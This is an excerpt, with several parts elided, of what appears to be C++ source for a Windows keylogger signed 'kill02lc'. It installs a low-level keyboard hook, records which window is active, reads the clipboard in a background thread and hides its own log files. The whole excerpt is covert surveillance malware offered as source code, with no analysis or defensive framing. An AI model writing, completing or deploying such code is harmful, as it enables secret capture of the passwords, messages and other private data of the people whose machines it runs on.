...
using namespace std;
//change hash 
std::string seed = "kill02lc";

bool capital = false, numLock = false, shift = false;
std::string inputfile = "", logFile = "";
...
LRESULT CALLBACK Proc_Start(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
...
void Job_Start() {
	HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, Proc_Start, NULL, 0);
	...
	while (1)
	{
		...
		if (GetCursorPos(&pNow))
		{
			...
			if (hwndPointNow)
			{
				...
				string temp_str_title= szWindowTitle;

				if(temp_str_title!= temp_tilte && temp_str_title!="")
				{
				Write("当前窗口为:");
				Write(temp_str_title +"\n");
				temp_tilte = temp_str_title;
				}
			}
			else
				cout << "Error!!" << endl;
...
int main() {
	cout << "auth:kill02lc" << endl;
	if (SetPath())
	{
		HideFiles();
		thread t(GetTextFromClipboard);
		t.detach();
		thread a(get_windows_title);
		a.detach();
		Job_Start();
	}
	return 0;
